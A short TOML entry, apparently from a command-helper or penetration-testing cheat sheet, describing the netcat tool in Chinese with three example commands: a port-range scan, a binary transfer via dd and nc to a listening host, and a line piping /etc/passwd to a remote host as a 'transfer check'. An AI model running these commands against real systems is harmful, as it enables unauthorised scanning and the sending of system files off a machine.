[meta]
name = "nc"
description = "用于 TCP/UDP 网络通信和调试的工具"
url = ""

examples = []

[[hit]]
command = "nc -z <host> <port_range>"
description = "扫描指定主机的端口范围"

[[hit]]
command = "dd if=/bin/ls | nc <host> <port>"
description = "通过 dd + nc 传输二进制文件，需在目标上提前用 `nc -nvlp <port> > ls` 监听"

[[hit]]
command = "nc <host> <port> < /etc/passwd"
description = "快速检查目标设备与 host 的 nc 传输能力"
